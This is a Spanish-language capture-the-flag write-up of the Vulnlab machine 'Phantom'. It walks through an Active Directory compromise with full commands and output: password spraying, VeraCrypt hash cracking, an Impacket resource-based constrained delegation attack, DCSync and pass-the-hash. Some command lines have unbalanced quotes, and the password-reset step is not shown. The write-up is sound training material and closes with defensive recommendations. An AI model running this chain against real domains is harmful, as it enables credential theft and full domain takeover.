---
title: "VL Phantom"
date: 2026-01-11 12:15:00 +0000
categories: [WriteUp, Vulnlab, Machine, Windows]
tags: [Windows, Vulnlab, WriteUp, Medium, Bloodhound, PasswordSpray, DACL]
image: /assets/img/posts//vl/phantom/Phantom-HTB.png
pin: false
Autor: vr0px  
Fecha**: 11 de Enero, 2026  
Plataforma**: VulnLab  
Dificultad**: Medium
---



## Descripción

**Phantom** es una máquina Windows de dificultad media que simula un entorno de Active Directory corporativo con múltiples vectores de ataque realistas. La explotación comienza con acceso anónimo a recursos compartidos SMB, donde se descubren credenciales expuestas en documentos internos de soporte técnico.

El camino de intrusión nos lleva a través del descubrimiento de un contenedor VeraCrypt cifrado que contiene archivos de configuración de **VyOS** (un sistema operativo de red basado en Linux), revelando credenciales adicionales de cuentas de servicio.

La escalada de privilegios explota una cadena de **permisos DACL mal configurados** en Active Directory:

1. **ForceChangePassword** - Capacidad de resetear contraseñas de usuarios específicos
2. **Resource-Based Constrained Delegation (RBCD)** - Abuso de delegación Kerberos para impersonación
3. **DCSync** - Extracción de hashes del Domain Controller

Esta máquina es un excelente escenario para practicar enumeración de Active Directory, análisis de permisos con BloodHound, criptografía de contenedores, y ataques avanzados de delegación Kerberos.

---

# Enumeración

## NMAP - Descubrimiento de Servicios

Iniciamos con un escaneo completo de puertos para identificar todos los servicios expuestos:

```fortran
» nmap -p- --open -sS --min-rate 8000 -Pn -n 10.129.234.63 -oG allPorts
Starting Nmap 7.93 ( https://nmap.org ) at 2026-01-10 20:04 -04
Nmap scan report for 10.129.234.63
Host is up (0.17s latency).
Not shown: 65515 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49667/tcp open  unknown
52154/tcp open  unknown
52155/tcp open  unknown
52161/tcp open  unknown
62904/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 16.97 seconds
```

### Análisis de Puertos Críticos

Los puertos abiertos confirman que estamos ante un **Domain Controller**:

- **53** (DNS) - Servidor DNS del dominio
- **88** (Kerberos) - Autenticación Kerberos
- **389/636/3268/3269** (LDAP/LDAPS) - Servicios de directorio
- **445** (SMB) - Compartición de archivos
- **5985** (WinRM) - Administración remota
- **3389** (RDP) - Escritorio remoto

### Escaneo de Versiones y Scripts

Profundizamos con un escaneo de versiones sobre los puertos identificados:

```fortran
» nmap -p53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,49664,49667,52154,52155,52161,62904 -sCV 10.129.234.63
Starting Nmap 7.93 ( https://nmap.org ) at 2026-01-10 20:04 -04

Nmap scan report for 10.129.234.63
Host is up (0.32s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-11 00:05:06Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: phantom.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: phantom.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-01-11T00:06:39+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=DC.phantom.vl
| Not valid before: 2026-01-10T00:01:21
|_Not valid after:  2026-07-12T00:01:21
| rdp-ntlm-info:
|   Target_Name: PHANTOM
|   NetBIOS_Domain_Name: PHANTOM
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: phantom.vl
|   DNS_Computer_Name: DC.phantom.vl
|   DNS_Tree_Name: phantom.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-01-11T00:06:00+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
52154/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
52155/tcp open  msrpc         Microsoft Windows RPC
52161/tcp open  msrpc         Microsoft Windows RPC
62904/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   311:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-01-11T00:06:03
|_  start_date: N/A
|_clock-skew: mean: 1s, deviation: 0s, median: 1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 110.62 seconds
```

### Información Recopilada

Del escaneo obtenemos datos críticos:

- **Dominio**: `phantom.vl`
- **FQDN del DC**: `DC.phantom.vl`
- **NetBIOS**: `PHANTOM`
- **Sistema Operativo**: Windows Server 2022 Build 20348
- **Firma SMB**: Habilitada y requerida (mayor seguridad)

### Configuración del /etc/hosts

Agregamos las entradas DNS necesarias para la resolución de nombres:

```ruby
echo '10.129.234.63  phantom.vl  dc.phantom.vl dc' | tee -a /etc/hosts
```

---

## SMB - Enumeración de Recursos Compartidos

Probamos acceso anónimo a SMB para enumerar recursos compartidos disponibles:

```ruby
> nxc smb 10.129.234.63 -u anonymous -p '' --shares
SMB         10.129.234.63   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.63   445    DC               [+] phantom.vl\anonymous: (Guest)
SMB         10.129.234.63   445    DC               [*] Enumerated shares
SMB         10.129.234.63   445    DC               Share           Permissions     Remark
SMB         10.129.234.63   445    DC               -----           -----------     ------
SMB         10.129.234.63   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.63   445    DC               C$                              Default share
SMB         10.129.234.63   445    DC               Departments Share
SMB         10.129.234.63   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.63   445    DC               NETLOGON                        Logon server share
SMB         10.129.234.63   445    DC               Public          READ
SMB         10.129.234.63   445    DC               SYSVOL                          Logon server share
```

### Recursos Compartidos Identificados

Tenemos acceso de **lectura** a:
- **IPC$** - Comunicación entre procesos
- **Public** - Recursos públicos (¡potencialmente interesante!)

### Exploración del Recurso Public

Nos conectamos al recurso compartido `Public` como usuario anónimo:

```ruby
> smbclient //10.129.234.63/Public -N
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Jul 11 11:03:14 2024
  ..                                DHS        0  Thu Aug 14 07:55:49 2025
  tech_support_email.eml              A    14565  Sat Jul  6 12:08:43 2024

                6127103 blocks of size 4096. 1426595 blocks available
smb: \> get tech_support_email.eml
getting file \tech_support_email.eml of size 14565 as tech_support_email.eml (6.4 KiloBytes/sec) (average 6.4 KiloBytes/sec)
smb: \>
```

### Análisis del Correo Electrónico

El archivo `tech_support_email.eml` contiene un correo electrónico con un archivo **PDF adjunto**:

![Correo Tech Support]({{ '/assets/img/posts/vl/phantom/Correo.png' | relative_url }}){: .center-image }
_Correo Tech Support_

Al abrir el PDF adjunto, descubrimos una **contraseña expuesta**:

![Contraseña en el PDF]({{ '/assets/img/posts/vl/phantom/PDF.png' | relative_url }}){: .center-image }
_Correo Tech Support_

**Credencial encontrada**: `Ph4nt0m@5t4rt!`

---

## Enumeración de Usuarios del Dominio

Con una contraseña en mano, necesitamos enumerar usuarios válidos del dominio para probar credenciales.

### RID Brute Force

Utilizamos **NetExec** para enumerar usuarios mediante RID cycling:

```ruby
> nxc smb 10.129.234.63 -u anonymous -p '' --rid-brute 10000 > users.txt
> cat users.txt | grep -i sidtypeuser | awk '{print $6}' | sed 's/^PHANTOM\\//' | sponge users.txt
```

Este comando:
1. Enumera RIDs hasta 10000
2. Filtra solo usuarios (SidTypeUser)
3. Extrae nombres de usuario
4. Elimina el prefijo del dominio
5. Guarda la lista limpia en `users.txt`

---

## Password Spray Attack

Con nuestra lista de usuarios y la contraseña encontrada, realizamos un ataque de password spraying:

```ruby
> nxc smb 10.129.234.63 -u users.txt -p 'Ph4nt0m@5t4rt!' --continue-on-success
<SNIP>
SMB         10.129.234.63   445    DC               [+] phantom.vl\ibryant:Ph4nt0m@5t4rt!
<SNIP>
```

### Primera Credencial Válida

**Usuario comprometido**: `ibryant`  
**Contraseña**: `Ph4nt0m@5t4rt!`

---

# Intrusión

## Enumeración SMB Autenticada

Con las credenciales de `ibryant`, enumeramos nuevamente los recursos compartidos:

```ruby
> nxc smb 10.129.234.63 -u ibryant -p 'Ph4nt0m@5t4rt!' --shares
SMB         10.129.234.63   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.63   445    DC               [+] phantom.vl\ibryant:Ph4nt0m@5t4rt!
SMB         10.129.234.63   445    DC               [*] Enumerated shares
SMB         10.129.234.63   445    DC               Share           Permissions     Remark
SMB         10.129.234.63   445    DC               -----           -----------     ------
SMB         10.129.234.63   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.63   445    DC               C$                              Default share
SMB         10.129.234.63   445    DC               Departments Share READ
SMB         10.129.234.63   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.63   445    DC               NETLOGON        READ            Logon server share
SMB         10.129.234.63   445    DC               Public          READ
SMB         10.129.234.63   445    DC               SYSVOL          READ            Logon server share
```

### Nuevo Recurso Accesible

Ahora tenemos acceso de **lectura** a `Departments Share` - un recurso que no era visible con acceso anónimo.

### Exploración de Departments Share

```ruby
> smbclient //10.129.234.63/'Departments Share' -U ibryant%'Ph4nt0m@5t4rt!'
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Jul  6 12:25:31 2024
  ..                                DHS        0  Thu Aug 14 07:55:49 2025
  Finance                             D        0  Sat Jul  6 12:25:11 2024
  HR                                  D        0  Sat Jul  6 12:21:31 2024
  IT                                  D        0  Thu Jul 11 10:59:02 2024

                6127103 blocks of size 4096. 2341561 blocks available
```

### Directorio IT - Información Sensible

La carpeta **IT** es especialmente interesante en contextos de seguridad:

```ruby
smb: \> cd IT
smb: \IT\> dir
  .                                   D        0  Thu Jul 11 10:59:02 2024
  ..                                  D        0  Sat Jul  6 12:25:31 2024
  Backup                              D        0  Sat Jul  6 14:04:34 2024
  mRemoteNG-Installer-1.76.20.24615.msi      A 43593728  Sat Jul  6 12:14:26 2024
  TeamViewerQS_x64.exe                A 32498992  Sat Jul  6 12:26:59 2024
  TeamViewer_Setup_x64.exe            A 80383920  Sat Jul  6 12:27:15 2024
  veracrypt-1.26.7-Ubuntu-22.04-amd64.deb      A  9201076  Sun Oct  1 16:30:37 2023
  Wireshark-4.2.5-x64.exe             A 86489296  Sat Jul  6 12:14:08 2024

                6127103 blocks of size 4096. 2341561 blocks available
```

### Archivo Crítico: Contenedor VeraCrypt

Observamos la presencia de **VeraCrypt** (software de cifrado), lo que sugiere que puede haber datos cifrados. Exploramos el subdirectorio `Backup`:

```ruby
smb: \IT\> cd Backup
smb: \IT\Backup\> dir
  .                                   D        0  Sat Jul  6 14:04:34 2024
  ..                                  D        0  Thu Jul 11 10:59:02 2024
  IT_BACKUP_201123.hc                 A 12582912  Sat Jul  6 14:04:14 2024

                6127103 blocks of size 4096. 2341561 blocks available
```

### Descarga del Contenedor VeraCrypt

El archivo `.hc` es un **contenedor VeraCrypt cifrado**:

```ruby
smb: \IT\Backup\> get IT_BACKUP_201123.hc
getting file \IT\Backup\IT_BACKUP_201123.hc of size 12582912 as IT_BACKUP_201123.hc (1050.8 KiloBytes/sec) (average 1050.8 KiloBytes/sec)
```

---

## Cracking del Contenedor VeraCrypt

### Pista de la Máquina

> Should you need to crack a hash, use a short custom wordlist based on company name and simple mutation rules commonly seen in real life passwords (e.g. year and a special character).
{: .prompt-tip }

Esta pista nos indica que debemos crear un wordlist personalizado basado en:
- Nombre de la empresa: **Phantom**
- Años recientes
- Caracteres especiales comunes

### Generación de Wordlist Personalizada

Creamos un script Python para generar el wordlist:

```python
start_year = 2020
end_year = 2026
output_file = "phantom_wordlist.txt"

special_symbols = [
    "!", "@", "#", "$", "%", "&", "*",
    "_", "-", "+", "=", ".", ",",
    "?", "¿", "¡"
]

with open(output_file, "w", encoding="utf-8") as f:
    for year in range(start_year, end_year + 1):
        for symbol in special_symbols:
            f.write(f"Phantom{year}{symbol}\n")

print(f"Wordlist generada correctamente: {output_file}")
```

Este script genera combinaciones como:
- `Phantom2020!`
- `Phantom2021@`
- `Phantom2024!`
- `Phantom2026@` 

### Ataque con Hashcat

Utilizamos **hashcat** con el modo específico para VeraCrypt:

```ruby
hashcat -a 0 -m 13721 IT_BACKUP_201123.hc phantom_wordlist.txt
<SNIP>
IT_BACKUP_201123.hc:Phantom2023!

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13721 (VeraCrypt SHA512 + XTS 512 bit (legacy))
Hash.Target......: IT_BACKUP_201123.hc
Time.Started.....: Sun Jan 11 18:38:58 2026 (10 secs)
Time.Estimated...: Sun Jan 11 18:39:08 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (phantom_wordlist.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       12 H/s (1.90ms) @ Accel:256 Loops:250 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 112/112 (100.00%)
Rejected.........: 0/112 (0.00%)
Restore.Point....: 0/112 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:499750-499999
Candidate.Engine.: Device Generator
Candidates.#1....: Phantom2020! -> Phantom2026¡

Started: Sun Jan 11 18:38:42 2026
Stopped: Sun Jan 11 18:39:09 2026
```

### Contraseña del Contenedor

**Contraseña VeraCrypt**: `Phantom2023!`

---

## Análisis del Contenedor Montado

Montamos el contenedor VeraCrypt con la contraseña descubierta:

![VeraCrypt.png]({{ '/assets/img/posts/vl/phantom/VeraCrypt.png' | relative_url }}){: .center-image }


### ¿Qué es VyOS?

Dentro del contenedor encontramos una estructura de archivos de **VyOS**:

> **VyOS** es un sistema operativo de red de código abierto basado en Linux (Debian) que funciona como router y firewall. Ofrece funcionalidades avanzadas de enrutamiento (BGP, OSPF), VPN, NAT y QoS, con una CLI similar a equipos Cisco/Juniper. Es ideal para entornos físicos y virtuales en la nube.

### Estructura del Sistema VyOS

```ruby
vr0px@DESKTOP-DCJA2GN:~/Phantom/phantom/Vyos$ ls -l
total 8052
lrwxrwxrwx   1 vr0px vr0px       7 Jul  5  2024 bin -> usr/bin
drwxr-xr-x   7 vr0px vr0px    4096 Jul  6  2024 config       ← ¡INTERESANTE!
drwxr-xr-x 128 vr0px vr0px   12288 Jul  6  2024 etc
drwxr-xr-x   4 vr0px vr0px    4096 Jul  6  2024 home
lrwxrwxrwx   1 vr0px vr0px       7 Jul  5  2024 lib -> usr/lib
lrwxrwxrwx   1 vr0px vr0px       9 Jul  5  2024 lib64 -> usr/lib64
drwxr-xr-x   2 vr0px vr0px    4096 Jul  5  2024 media
drwxr-xr-x   2 vr0px vr0px    4096 Jul  5  2024 mnt
drwxr-xr-x   3 vr0px vr0px    4096 Jul  6  2024 opt
drwx------   4 vr0px vr0px    4096 Jul  6  2024 root
drwxr-xr-x  44 vr0px vr0px    4096 Jul  6  2024 run
lrwxrwxrwx   1 vr0px vr0px       8 Jul  5  2024 sbin -> usr/sbin
drwxr-xr-x   4 vr0px vr0px    4096 Jul  5  2024 srv
drwxr-xr-x  10 vr0px vr0px    4096 Jul  6  2024 tmp
drwxr-xr-x  13 vr0px vr0px    4096 Jul  5  2024 var
-rwx------   1 vr0px vr0px 8191211 Jan 10 21:30 vyos_backup.tar.gz
```

### Directorio de Configuración

```ruby
vr0px@DESKTOP-DCJA2GN:~/Phantom/phantom/Vyos$ cd config/
vr0px@DESKTOP-DCJA2GN:~/Phantom/phantom/Vyos/config$ ls -l
total 36
drwxr-xr-x 2 vr0px vr0px  4096 Jul  6  2024 archive
drwxr-xr-x 2 vr0px vr0px  4096 Jul  5  2024 auth
-rw-r----- 1 vr0px vr0px 10705 Jul  6  2024 config.boot     ← ¡ARCHIVO CRÍTICO!
drwxr-xr-x 2 vr0px vr0px  4096 Jul  5  2024 scripts
drwxr-xr-x 2 vr0px vr0px  4096 Jul  5  2024 support
drwxr-xr-x 2 vr0px vr0px  4096 Jul  5  2024 user-data
-rw-r--r-- 1 vr0px vr0px   174 Jul  6  2024 vyos-activate.log
```

### Credenciales en config.boot

Al analizar el archivo `config.boot`, encontramos **credenciales almacenadas en texto claro**:

![VyOs Password]({{ '/assets/img/posts/vl/phantom/VyOs-Password.png' | relative_url }}){: .center-image }

**Contraseña encontrada**: `gB6XTcqVP5MlP7Rc`

### Validación de Credenciales

Probamos esta contraseña contra nuestra lista de usuarios del dominio:

```ruby
> nxc smb 10.129.234.63 -u users.txt -p 'gB6XTcqVP5MlP7Rc' --continue-on-success
<SNIP>
SMB         10.129.234.63   445    DC               [+] phantom.vl\svc_sspr:gB6XTcqVP5MlP7Rc
<SNIP>
```

### Segunda Credencial Válida

**Usuario comprometido**: `svc_sspr` (cuenta de servicio)  
**Contraseña**: `gB6XTcqVP5MlP7Rc`

---

## BloodHound - Mapeo de Active Directory

Recopilamos información detallada de la estructura de Active Directory usando BloodHound:

```ruby
bloodhound-ce.py --zip -c All -d "phantom.vl" -u "svc_sspr" -p 'gB6XTcqVP5MlP7Rc' -dc "dc.phantom.vl" -ns 10.129.234.63
```

Este comando ejecuta todos los colectores de BloodHound:
- **Session** - Sesiones activas
- **LocalAdmin** - Administradores locales
- **Group** - Membresía de grupos
- **Trusts** - Relaciones de confianza
- **ACL** - Listas de control de acceso
- **Container** - Contenedores de AD
- **ObjectProps** - Propiedades de objetos

### Análisis de Permisos del Usuario

Buscamos los grupos a los que pertenece `svc_sspr`:

![Bloodhound]({{ '/assets/img/posts/vl/phantom/BloodHound.png' | relative_url }}){: .center-image }

### Descubrimiento Crítico

El usuario `svc_sspr` es miembro del grupo **REMOTE MANAGEMENT USERS**, lo que significa que puede autenticarse vía **WinRM**.

---

## Acceso Inicial - Flag de Usuario

Nos conectamos al Domain Controller usando Evil-WinRM:

```ruby
evil-winrm -u 'svc_sspr' -p 'gB6XTcqVP5MlP7Rc' -i 10.129.234.63

Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_sspr\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\svc_sspr\Desktop> type user.txt
c19d05bc245fd24b9dec73a4ff096b04
*Evil-WinRM* PS C:\Users\svc_sspr\Desktop>
```

### Flag de Usuario Obtenida

**User Flag**: `c19d05bc245fd24b9dec73a4ff096b04`

---

# Escalada de Privilegios

## Análisis de Permisos DACL

Revisamos los permisos **Outbound Object Control** del usuario `svc_sspr` en BloodHound:

![ForceChangePassword]({{ '/assets/img/posts/vl/phantom/ForceChangePasword.png' | relative_url }}){: .center-image }

### Permiso ForceChangePassword

El usuario `svc_sspr` tiene el permiso **ForceChangePassword** sobre los siguientes usuarios:
- **RNICHOLS**
- **WSILVA**
- **CROSE**



---

## Resource-Based Constrained Delegation (RBCD)

### ¿Qué es RBCD?

Antes de continuar, es fundamental entender qué es **Resource-Based Constrained Delegation**:

**RBCD** es un mecanismo de delegación de Kerberos introducido en Windows Server 2012 que permite a un **recurso (como un servidor)** decidir quién puede delegar credenciales hacia él, en lugar de que el administrador del dominio configure la delegación desde el cliente.

#### Concepto Clave: Delegación Kerberos

La delegación permite que un servicio actúe **en nombre de un usuario** para acceder a otros recursos. Imagina este escenario:

1. **Usuario** → Accede a **Servidor Web**
2. **Servidor Web** → Necesita acceder a **Base de Datos** como el usuario
3. **Delegación** → Permite que el Servidor Web use las credenciales del usuario para acceder a la BD

#### Tipos de Delegación

- **Unconstrained Delegation** (No restringida): El servicio puede delegar a CUALQUIER servicio (muy peligroso)
- **Constrained Delegation** (Restringida): Solo puede delegar a servicios específicos configurados por el admin
- **Resource-Based Constrained Delegation** (RBCD): El RECURSO decide quién puede delegar hacia él

#### ¿Por qué RBCD es Explotable?

En RBCD, el control se da mediante el atributo **msDS-AllowedToActOnBehalfOfOtherIdentity** del objeto destino. Si tenemos permisos para **modificar este atributo**, podemos:

1. Configurar que nuestra cuenta controlada pueda "actuar en nombre de otros" hacia el recurso
2. Usar protocolos Kerberos **S4U2Self** y **S4U2Proxy** para obtener tickets de servicio
3. **Impersonar a cualquier usuario** (incluido el Administrador) hacia ese recurso

### Análisis de Permisos de RNICHOLS

Investigamos los permisos del usuario RNICHOLS en BloodHound:

![rbcd]({{ '/assets/img/posts/vl/phantom/rbcd.png' | relative_url }}){: .center-image }

### Cadena de Ataque Identificada

**RNICHOLS** → Miembro de → **ICT SECURITY**  
**ICT SECURITY** → Tiene permiso →  **AddAllowedToAct** sobre → **DC$ (Domain Controller)**

#### Significado de los Permisos

- **AddAllowedToAct**: **Modificar msDS-AllowedToActOnBehalfOfOtherIdentity** ← ¡Esto es RBCD!

### El Ataque RBCD Paso a Paso

El ataque RBCD funciona de la siguiente manera:

1. **Modificar msDS-AllowedToActOnBehalfOfOtherIdentity** del DC para incluir a RNICHOLS
2. **Solicitar un TGT** (Ticket Granting Ticket) para RNICHOLS
3. **S4U2Self**: Solicitar un ticket de servicio para nosotros mismos impersonando al Administrador
4. **S4U2Proxy**: Usar ese ticket para solicitar acceso al DC como Administrador
5. **DCSync**: Con permisos de administrador, extraer todos los hashes del dominio

---

## Explotación de RBCD

### Paso 1: Modificar el Atributo de Delegación

Utilizamos la herramienta **rbcd.py** de Impacket para modificar el atributo:

```ruby
> rbcd.py -delegate-from 'RNICHOLS' -delegate-to 'DC -dc-ip 10.129.234.63 -action 'write' 'phantom.vl'/'RNICHOLS':'P@ssword123
Impacket v0.13.0.dev0+20250717.182627.84ebce48 - Copyright Fortra, LLC and its affiliated companies

[+] NTLM bind succeeded.
[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] RNICHOLS can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     rnichols     (S-1-5-21-4029599044-1972224926-2225194048-1112)
```

**¿Qué acabamos de hacer?**

Hemos modificado el atributo `msDS-AllowedToActOnBehalfOfOtherIdentity` del DC para especificar que **RNICHOLS** puede actuar en nombre de otros usuarios hacia el DC.

### Paso 2: Obtener TGT de RNICHOLS

Solicitamos un Ticket Granting Ticket (TGT) para RNICHOLS:

```ruby
> getTGT.py -hashes :$(pypykatz crypto nt 'P@ssword123) 'phantom.vl'/'RNICHOLS'
Impacket v0.13.0.dev0+20250717.182627.84ebce48 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in RNICHOLS.ccache
```

**Exportamos el ticket al entorno**:

```ruby
> export KRB5CCNAME=RNICHOLS.ccache
```

**¿Qué es un TGT?**

Un TGT es como una "tarjeta de identificación" que el KDC (Key Distribution Center) nos da después de autenticarnos. Con este TGT podemos solicitar tickets de servicio (TGS) para acceder a recursos específicos.

### Paso 3: Extraer la Session Key del Ticket

```ruby
> describeTicket.py RNICHOLS.ccache | grep 'Ticket Session Key'
[*] Ticket Session Key            : a36a3fb8522a8a906f0b5a3c2970d00a
```

**¿Para qué necesitamos la Session Key?**

La Session Key es la clave de cifrado de nuestra sesión Kerberos. La necesitamos para los siguientes pasos del ataque.

### Paso 4: Actualizar Credenciales con la Session Key

```ruby
> changepasswd.py -newhashes :a36a3fb8522a8a906f0b5a3c2970d00a 'phantom.vl'/'RNICHOLS':'P@ssword123@'10.129.234.63'
Impacket v0.13.0.dev0+20250717.182627.84ebce48 - Copyright Fortra, LLC and its affiliated companies

[*] Changing the password of phantom.vl\RNICHOLS
[*] Connecting to DCE/RPC as phantom.vl\RNICHOLS
[*] Password was changed successfully.
[!] User might need to change their password at next logon because we set hashes (unless password never expires is set).
```

### Paso 5: Solicitar Ticket de Servicio Impersonando al Administrador

Aquí es donde ocurre la **magia del ataque RBCD**. Usamos **S4U2Self** y **S4U2Proxy**:

```ruby
> getST.py -k -no-pass -u2u -impersonate "Administrator" -spn "cifs/DC.phantom.vl" 'phantom.vl'/'RNICHOLS'
Impacket v0.13.0.dev0+20250717.182627.84ebce48 - Copyright Fortra, LLC and its affiliated companies

[*] Impersonating Administrator
[*] Requesting S4U2self+U2U
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_DC.phantom.vl@PHANTOM.VL.ccache
```

**¿Qué acabamos de hacer?**

1. **S4U2Self**: Solicitamos un ticket de servicio para nosotros mismos (RNICHOLS) pero **impersonando al Administrador**
2. **S4U2Proxy**: Usamos ese ticket para solicitar acceso al servicio CIFS del DC **como si fuéramos el Administrador**

El resultado es un ticket que nos permite acceder al DC con privilegios de **Administrador del Dominio**.

### Paso 6: Verificar Acceso Administrativo

Exportamos el ticket del Administrador:

```ruby
> export KRB5CCNAME=Administrator@cifs_DC.phantom.vl@PHANTOM.VL.ccache
```

Verificamos nuestro acceso:

```ruby
> nxc smb 10.129.234.63 -u 'Administrator' -k --use-kcache
SMB         10.129.234.63   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.63   445    DC               [+] phantom.vl\Administrator from ccache (admin)
```

### Confirmación

El mensaje **(admin)** confirma que tenemos privilegios de **Administrador del Dominio**.

---

## DCSync - Extracción de Credenciales

Con privilegios de administrador, podemos ejecutar un **DCSync** para extraer todos los hashes del dominio:

```ruby
> nxc smb 10.129.234.63 -k --use-kcache --ntds --user Administrator
SMB         10.129.234.63   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.63   445    DC               [+] phantom.vl\Administrator from ccache (admin)
SMB         10.129.234.63   445    DC               [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         10.129.234.63   445    DC               Administrator:500:aad3b435b51404eeaad3b435b51404ee:aa2abd9db4f5984e657f834484512117:::
SMB         10.129.234.63   445    DC               [+] Dumped 1 NTDS hashes to /root/.nxc/logs/ntds/DC_10.129.234.63_2026-01-11_195719.ntds of which 1 were added to the database
```

### Hash del Administrador Extraído

**NT Hash del Administrator**: `aa2abd9db4f5984e657f834484512117`

---

## Pass-the-Hash

Usamos el hash NT para autenticarnos como Administrador:

```ruby
> evil-winrm -u 'administrator' -H aa2abd9db4f5984e657f834484512117 -i 10.129.234.63

Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
eeec0b54025b3ccfd85aa526ab3f0340
*Evil-WinRM* PS C:\Users\Administrator\Desktop>
```

### Flag de Root Obtenida

**Root Flag**: `eeec0b54025b3ccfd85aa526ab3f0340`

---

# Conclusión

## Cadena de Ataque Completa

1. **Enumeración SMB** → Acceso anónimo a recurso `Public`
2. **Credenciales expuestas** → PDF con contraseña `Ph4nt0m@5t4rt!`
3. **Password Spray** → Usuario `ibryant` comprometido
4. **Departments Share** → Acceso a archivos de IT
5. **Contenedor VeraCrypt** → Cifrado con `Phantom2023!`
6. **Configuración VyOS** → Credenciales de `svc_sspr`
7. **BloodHound** → Identificación de permisos DACL
8. **ForceChangePassword** → Control de usuario `RNICHOLS`
9. **RBCD Attack** → Impersonación del Administrador
10. **DCSync** → Extracción de hashes del dominio
11. **Pass-the-Hash** → Acceso total como Administrator

## Lecciones Aprendidas

### Malas Configuraciones Explotadas

- ✗ Credenciales en archivos públicos
- ✗ Contraseñas débiles predecibles
- ✗ Permisos DACL excesivos
- ✗ Cuentas de servicio con permisos privilegiados
- ✗ Delegación Kerberos mal configurada

### Recomendaciones de Seguridad

- ✓ No almacenar credenciales en recursos compartidos
- ✓ Implementar políticas de contraseñas robustas
- ✓ Auditar permisos DACL regularmente con BloodHound
- ✓ Aplicar principio de mínimo privilegio
- ✓ Monitorear eventos de delegación Kerberos
- ✓ Implementar detección de DCSync (Event ID 4662)

---

## Referencias

- [The Hacker Recipes - RBCD](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd)
- [Impacket Toolkit](https://github.com/fortra/impacket)
- [BloodHound Documentation](https://bloodhound.specterops.io/home)
- [Microsoft Kerberos Delegation](https://learn.microsoft.com/es-es/windows-server/security/kerberos/kerberos-constrained-delegation-overview)

---
